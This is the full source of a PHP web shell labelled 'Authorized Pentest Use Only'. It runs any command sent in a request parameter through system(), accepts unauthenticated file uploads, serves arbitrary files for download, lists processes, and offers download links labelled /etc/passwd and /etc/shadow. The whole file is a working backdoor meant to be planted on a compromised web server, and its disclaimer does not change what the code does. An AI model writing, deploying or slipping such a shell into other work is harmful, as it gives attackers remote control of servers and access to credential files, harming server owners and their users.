<?php
// PHP Web Shell - Authorized Pentest Use Only
// Features: Command execution, file upload/download, system info, process management

if(isset($_POST['cmd']) || isset($_GET['cmd'])) {
    $cmd = $_POST['cmd'] ?? $_GET['cmd'];
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}

if(isset($_FILES['file'])) {
    if(move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
        echo "File uploaded: " . $_FILES['file']['name'];
    }
}

if(isset($_GET['download'])) {
    $file = $_GET['download'];
    if(file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>PHP Shell</title>
    <style>
        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
        input, textarea { background: #333; color: #00ff00; border: 1px solid #00ff00; }
        button { background: #00ff00; color: #000; border: none; padding: 5px 10px; }
        pre { background: #000; padding: 10px; border: 1px solid #00ff00; }
    </style>
</head>
<body>
    <h2>PHP Web Shell</h2>
    
    <?php
    echo "<b>Server:</b> " . $_SERVER['SERVER_SOFTWARE'] . "<br>";
    echo "<b>PHP:</b> " . phpversion() . "<br>";
    echo "<b>User:</b> " . get_current_user() . "<br>";
    echo "<b>Path:</b> " . getcwd() . "<br>";
    echo "<b>Writable:</b> " . (is_writable(getcwd()) ? 'Yes' : 'No') . "<br>";
    ?>
    
    <form method="POST">
        <textarea name="cmd" rows="5" cols="80" placeholder="Enter command here..."><?php echo htmlspecialchars($_POST['cmd'] ?? ''); ?></textarea><br>
        <button type="submit">Execute</button>
    </form>
    
    <h3>File Upload</h3>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file"><br>
        <button type="submit">Upload</button>
    </form>
    
    <h3>Downloads</h3>
    <a href="?download=passwd" style="color:#00ff00;">/etc/passwd</a> | 
    <a href="?download=shadow" style="color:#00ff00;">/etc/shadow</a> | 
    <a href="?download=apache2.conf" style="color:#00ff00;">Apache Config</a><br><br>
    
    <h3>Processes</h3>
    <pre><?php echo shell_exec('ps aux'); ?></pre>
</body>
</html>